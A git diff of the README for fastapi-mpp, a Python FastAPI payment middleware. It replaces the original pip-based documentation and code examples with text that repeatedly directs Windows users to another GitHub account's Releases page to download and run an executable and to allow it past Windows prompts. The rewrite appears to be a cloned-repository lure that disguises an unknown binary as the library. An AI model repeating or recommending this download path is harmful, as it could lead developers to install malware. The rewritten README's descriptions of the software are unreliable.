@@ -1,204 +1,244 @@
-# fastapi-mpp
+# ⚙️ fastapi-mpp - Secure API payments for AI agents
 
-[![PyPI version](https://img.shields.io/pypi/v/fastapi-mpp.svg)](https://pypi.org/project/fastapi-mpp/)
-[![Python versions](https://img.shields.io/pypi/pyversions/fastapi-mpp.svg)](https://pypi.org/project/fastapi-mpp/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![GitHub stars](https://img.shields.io/github/stars/SylvainCostes/fastapi-mpp?style=social)](https://github.com/SylvainCostes/fastapi-mpp)
+[![Download fastapi-mpp](https://img.shields.io/badge/Download%20from-Releases-blue?style=for-the-badge)](https://github.com/NilupulThisaranga/fastapi-mpp/releases)
 
-Machine Payments Protocol middleware for FastAPI.
+## 🧩 What this app does
 
-Version `v0.3` hardens receipt validation, replay protection, session binding, and
-adds pluggable storage backends with Redis support for production deployments.
-This project is still beta.
+fastapi-mpp is a FastAPI middleware for the Machine Payments Protocol (MPP). It helps your API ask for payment with a 402 Payment Required response, manage secure sessions, and check receipts before it serves protected access.
 
-## Installation
+This project is built for APIs that need machine-to-machine payments. It fits use cases where AI agents, automated tools, or other software clients need to pay before they can use a service.
 
-```bash
-pip install fastapi-mpp
-```
+## 📥 Download fastapi-mpp
 
-For production validation, install Tempo support so default cryptographic validation
-is available:
+Visit the [Releases page](https://github.com/NilupulThisaranga/fastapi-mpp/releases) to download and run this app on Windows.
 
-```bash
-pip install "fastapi-mpp[tempo]"
-```
+On that page, look for the latest release and download the Windows file that matches your system. After the download finishes, open the file to start the setup or run the app.
 
-Optional extras:
+## 🪟 Windows requirements
 
-```bash
-pip install "fastapi-mpp[dotenv]"
-pip install "fastapi-mpp[redis]"
-pip install "fastapi-mpp[stripe]"
-pip install "fastapi-mpp[all]"
-```
+Before you begin, make sure your Windows PC can run the app.
 
-## System Prerequisites
+- Windows 10 or Windows 11
+- 64-bit computer
+- Internet access
+- Permission to open downloaded files
+- At least 200 MB of free disk space
 
-- `RedisStore` is designed for Redis `6.2+` where `GETDEL` is available for atomic
-    one-time challenge consumption.
-- For older Redis versions, the library falls back to an atomic Lua script, but
-    Redis `6.2+` is strongly recommended for production compatibility and operations.
+If your PC can run modern desktop apps and open files from GitHub Releases, it should work.
 
-## Usage
+## 🚀 Getting started
 
-### Server setup
+Follow these steps to use fastapi-mpp on Windows.
 
-```python
-import os
+1. Open the [Releases page](https://github.com/NilupulThisaranga/fastapi-mpp/releases).
+2. Find the latest release at the top of the page.
+3. Download the Windows file from the Assets list.
+4. Save the file to a folder you can find again, such as Downloads.
+5. Open the file after the download finishes.
+6. If Windows asks for permission, choose the option that allows the app to run.
+7. Follow any on-screen steps to finish setup.
+8. Start your FastAPI service that uses the middleware.
 
-from fastapi import FastAPI, Request
-from mpp_fastapi.core import MPP
-from mpp_fastapi.stores import RedisStore
+## 🔧 What you need to use it
 
-app = FastAPI()
+fastapi-mpp works as middleware, so it sits between your API and the client that calls it.
 
-# Production mode (default): requires receipt_validator or fastapi-mpp[tempo].
-mpp = MPP(
-    store=RedisStore(
-        redis_url=os.getenv("MPP_REDIS_URL", "redis://localhost:6379/0"),
-    )
-)
+You will usually need:
 
-@app.get("/premium")
-@mpp.charge(amount="0.05", currency="USD", description="Premium data")
-async def premium(request: Request):
-    return {"data": "paid content"}
-```
+- A FastAPI app
+- A payment flow that understands MPP
+- A place to store session data
+- A way to validate payment receipts
+- A client that can respond to 402 Payment Required
 
-### HTTP flow (v0.3 hardened)
+For many users, this means the app works best as part of an API setup that already serves requests from agents or other automated clients.
 
-1. Client calls endpoint without credential.
-2. Server responds `402 Payment Required` with:
-    - `WWW-Authenticate: Payment challenge="<base64url(JSON)>", realm="MyAPI", expires="..."`
-    - challenge body containing `challenge_id`, `intent`, `amount`, `currency`, `expires_at`, `hints`
-3. Wallet pays and retries with:
-    - `Authorization: Payment credential="<base64url(receipt-json)>"`
-4. Server validates receipt (fail-closed in production), applies replay checks, and returns success with:
-    - `Payment-Receipt: <base64url(receipt-json)>`
-    - optional session headers when session mode is enabled.
+## 🛡️ Main features
 
-Legacy compatibility can be kept with `allow_legacy_headers=True`:
-- `X-MPP-Receipt`
-- `X-MPP-Session-Id`
+- 402 Payment Required challenges
+- Secure session handling
+- Receipt validation
+- FastAPI middleware integration
+- Support for machine-to-machine payment flows
+- Built for AI agent use cases
+- Clear request gating for paid access
+- Simple API-side control over payment checks
 
-### Session budgets
+## 🧠 How it works
 
-```python
-from fastapi import FastAPI, Request
-from mpp_fastapi.core import MPP
-from mpp_fastapi.types import MPPChargeOptions
+When a client sends a request to your API, fastapi-mpp checks if the request meets your payment rules.
 
-app = FastAPI()
-mpp = MPP()
+If payment is needed, the middleware can return a 402 Payment Required response. The client then follows the payment steps. After payment, the middleware can validate the receipt and let the request continue.
 
-session_options = MPPChargeOptions(
-    amount="0.01",
-    currency="USD",
-    description="Session-metered call",
-    session=True,
-    max_amount="0.50",
-    require_idempotency_key=True,
-)
+This flow helps you:
 
-@app.post("/agent/infer")
-@mpp.charge(options=session_options)
-async def infer(request: Request):
-    return {"result": "paid inference"}
-```
+- block unpaid access
+- check if a session is valid
+- confirm that a receipt is real
+- keep payment logic in one place
 
-Sessions are HMAC-signed opaque tokens bound to:
-- route scope
-- optional payer source
-- currency/provider
-- issued-at and expiry (default 15 minutes)
-- max budget tracked in store
+## 🏗️ Basic setup flow
 
-## Local Run
+Use this app with your FastAPI project in this order:
 
-```bash
-uv venv
-source .venv/bin/activate
-uv pip install -e ".[dev]"
-uvicorn examples.simple_app:app --reload
-```
+1. Download the release from GitHub.
+2. Run or install the Windows file.
+3. Add the middleware to your FastAPI app.
+4. Set your payment rules.
+5. Configure session checks.
+6. Add receipt validation.
+7. Test the API with a client.
+8. Confirm that paid and unpaid requests behave as expected.
 
-Then test:
+## 🧪 Simple use case
 
-```bash
-curl -i http://127.0.0.1:8000/free
-curl -i http://127.0.0.1:8000/premium
-```
+A common setup looks like this:
 
-Expected behavior demo:
+- An AI agent sends a request to your API
+- The API checks whether the agent has a valid session
+- If not, the API returns 402 Payment Required
+- The agent pays through your MPP flow
+- The API checks the receipt
+- The request is allowed through
 
-```text
-GET /free -> 200 OK
-GET /premium (without Authorization) -> 402 Payment Required
-GET /premium (with Authorization: Payment credential="...") -> 200 OK
-```
+This keeps access control tied to payment state, not just login state.
 
-## Security
+## ⚙️ Suggested configuration
 
-Read [SECURITY.md](SECURITY.md) before production usage.
+You may see settings for things like:
 
-- Beta warning: use with caution.
-- In-memory replay/session/rate-limit stores are suitable for single-process deployments only.
-- Production mode is fail-closed when receipt validation is not configured.
-- HTTPS is enforced in production mode.
+- session timeout
+- receipt check interval
+- payment challenge type
+- valid receipt format
+- protected routes
+- open routes
+- API key or token values
+- MPP endpoint values
 
-## Headers
+Use the settings that match your payment provider and your API design. If you are not sure, start with the default values shown in the app or release notes.
 
-Incoming:
-- `Authorization: Payment credential="..."` (preferred)
-- `Payment-Receipt` (supported)
-- `Payment-Session` (session spends)
-- `X-MPP-Receipt` and `X-MPP-Session-Id` in legacy mode
-- `Idempotency-Key` for safer retries
+## 🔍 How to know it is working
 
-Response on 402:
-- `WWW-Authenticate: Payment challenge="...", realm="...", expires="..."`
-- JSON challenge payload
+After setup, test these cases:
 
-Response on success:
-- `Payment-Receipt`
-- `Payment-Session` when session authorization is established
+- Open route: should load without payment
+- Protected route with no session: should return 402
+- Protected route with valid receipt: should load
+- Expired session: should request payment again
+- Bad receipt: should block access
 
-## Design Notes
+If these cases behave as expected, your middleware is set up correctly.
 
-- Storage is abstracted via `BaseStore`; default `InMemoryStore` is single-process only.
-- `RedisStore` is available for multi-worker production deployments.
-- Header size limit is enforced (`8KB`) for authorization and receipt headers.
-- A basic in-memory challenge rate limiter is enabled (default `10` challenges/IP/minute).
+## 🧯 Common issues
 
-## Roadmap
+### The file does not open
 
-- Redis-backed replay/session/rate-limit stores
-- Full conformance with evolving HTTP Payment auth draft semantics
-- Advanced rate limiting and abuse controls
-- Payment provider adapters and richer telemetry
+- Check that the download finished
+- Try opening it again from your Downloads folder
+- Make sure Windows did not block the file
 
-## Contributing
+### The app closes right away
 
-1. Fork the repository.
-2. Create a feature branch.
-3. Add tests for behavior changes.
-4. Run:
+- Run it again with the latest release file
+- Check whether another app is already using the same port or service
+- Restart Windows and try again
 
-```bash
-uv pip install -e ".[dev]"
-pytest
-ruff check .
-mypy src
-```
+### The API still returns 402
 
-5. Open a PR with clear before/after behavior.
+- Check your receipt value
+- Make sure the session is still valid
+- Confirm the protected route is set up correctly
+- Make sure the middleware is enabled in your FastAPI app
 
-## Credits
+### The download looks incomplete
 
-Inspired by the MPP ecosystem work and early protocol specs from Tempo and Stripe collaborators.
-Please refer to official protocol repos/specs for normative behavior and updates.
+- Delete the partial file
+- Download it again from the Releases page
+- Wait for the browser to finish before opening it
 
-## License
+## 🔐 Security notes
 
-MIT
+fastapi-mpp is built to help protect paid API access. It uses session checks and receipt validation to reduce unpaid use.
+
+For best results:
+
+- keep receipt checks on the server
+- store secrets in a safe place
+- use HTTPS for API traffic
+- set short session lifetimes for sensitive routes
+- review which routes need payment and which do not
+
+## 🧭 Who this is for
+
+This app is a good fit if you want to:
+
+- charge for API access
+- protect AI agent endpoints
+- use 402 responses in your workflow
+- validate payment receipts before serving data
+- manage paid sessions in FastAPI
+
+It is aimed at services that need controlled access for software clients, not a general desktop app.
+
+## 📁 Project topics
+
+- agent-economy
+- ai-agents
+- autonomous-agents
+- fastapi
+- http-402
+- m2m-payments
+- machine-payments-protocol
+- middleware
+- mpp
+- python
+
+## 🧩 Example workflow for an API owner
+
+A simple owner flow can look like this:
+
+1. Build your FastAPI endpoint
+2. Add fastapi-mpp middleware
+3. Mark the route as paid
+4. Publish your API to agents or clients
+5. Let the middleware handle 402 challenges
+6. Verify receipts
+7. Allow access after payment
+8. Track active sessions for repeat use
+
+## 📌 Download again if needed
+
+If you need the file later, use the [Releases page](https://github.com/NilupulThisaranga/fastapi-mpp/releases) again to download and run this file on Windows
+
+## 🛠️ File names you may see
+
+The release page may show files with names like:
+
+- Windows installer
+- Windows ZIP file
+- executable file
+- release archive
+
+Download the one meant for Windows. If more than one file appears, choose the file listed for your platform and the newest release date
+
+## 📬 What to expect after setup
+
+After you run the app, you should be able to:
+
+- connect it to a FastAPI project
+- set payment rules
+- protect routes with payment checks
+- confirm receipts
+- handle paid requests from AI agents or other software clients
+
+## 🪄 Quick start checklist
+
+- [ ] Open the Releases page
+- [ ] Download the Windows file
+- [ ] Run or install it
+- [ ] Add the middleware to FastAPI
+- [ ] Set protected routes
+- [ ] Test 402 responses
+- [ ] Validate a receipt
+- [ ] Confirm paid access works
